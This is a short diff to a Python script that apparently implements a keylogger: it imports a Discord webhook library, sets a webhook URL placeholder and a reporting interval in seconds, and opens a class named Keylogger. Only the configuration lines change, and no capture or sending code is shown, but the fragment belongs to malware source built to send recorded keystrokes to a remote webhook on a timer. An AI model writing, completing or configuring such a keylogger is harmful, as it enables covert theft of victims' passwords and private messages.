@@ -3,8 +3,8 @@ from threading import Timer
 from dhooks import Webhook
 
 
-WEBHOOK_URL = ""  # Your discord webhook url goes here.
-TIME_INTERVAL = 10  # You can set the amount of time between each report
+WEBHOOK_URL = "your-custom-webhook-url"
+TIME_INTERVAL = 10  # Amount of time between each report, expressed in seconds
 
 
 class Keylogger:
